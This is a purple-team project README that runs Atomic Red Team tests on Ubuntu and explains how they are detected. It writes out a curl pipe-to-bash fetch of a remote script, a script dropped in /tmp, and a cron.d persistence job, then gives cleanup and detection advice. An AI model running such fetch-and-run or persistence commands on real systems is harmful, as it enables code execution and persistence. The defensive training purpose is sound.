# Atomic Red Team Simulation and Detection

## Overview
A purple team simulation using Atomic Red Team to execute real attack techniques on a Linux environment, with detection captured via session logging.

## Techniques Executed
- T1059.004 - Command and Scripting Interpreter: Bash
- T1053.003 - Scheduled Task/Job: Cron

## Attack Logic

### T1059.004 - Test #1: Create and Execute Bash Shell Script

Commands executed:

echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh
echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh
chmod +x /tmp/art.sh
sh /tmp/art.sh

Result: Created and executed a bash script from /tmp/. This is a common attacker technique for running payloads.

### T1059.004 - Test #2: Command-Line Interface (pipe-to-shell)

Command executed:

curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash

Result: Downloaded a remote script and piped it directly to bash. This is a classic attacker pattern often used for one-line payload delivery.

### T1053.003 - Cron Persistence

Command executed:

echo "* * * * * echo 'Hello from Atomic Red Team' > /tmp/atomic.log" | sudo tee /etc/cron.d/atomic-test
sudo chmod 644 /etc/cron.d/atomic-test

Result: Created a cron job in /etc/cron.d/ that runs every minute. This is a persistence technique. The attacker ensures their code runs even after reboot.

## Detection Logic

Detection was performed using script -f logs/detection.log - a Linux utility that records the full terminal session. Every command executed during the attack was captured with a timestamp.

In production, this activity would be detected by:
- auditd - Linux kernel-level audit logging, capturing every execve() system call
- Sysmon for Linux - process creation, file modification, network connections
- EDR tools - CrowdStrike, SentinelOne, Wazuh

The commands above leave a trail in:
- /var/log/auth.log (sudo commands)
- /var/log/syslog (cron activity)
- /etc/cron.d/atomic-test (persistence artifact)
- /tmp/art.sh (attacker script)

## Results

### Setup
![Setup](screenshots/01_setup.png)

### Attack Output
![Attack Output](screenshots/02_output.png)

### Detection Log
![Detection Log](screenshots/03_findings.png)

### Cleanup
![Cleanup](screenshots/04_cleanup.png)

## Cleanup Commands

sudo rm /etc/cron.d/atomic-test
rm /tmp/art.sh

## Purple Team Insight

Running real attack techniques made the detection gap clear. On Linux, without auditd or Sysmon, T1059 (arbitrary code execution) and T1053 (scheduled task persistence) leave almost no trace in default logging. A SOC analyst looking at /var/log/syslog alone would miss the bash script execution. This project showed me why endpoint telemetry at the kernel level is essential for real detection engineering.

## Files
- logs/detection.log - full session recording of attack commands
- screenshots/ - visual proof of attack and detection
- atomic-red-team/ - cloned Atomic Red Team repository

## Built With
Atomic Red Team, Bash, Linux (Ubuntu via Codespaces)

## Author
Meenal Vishwakarma | 2026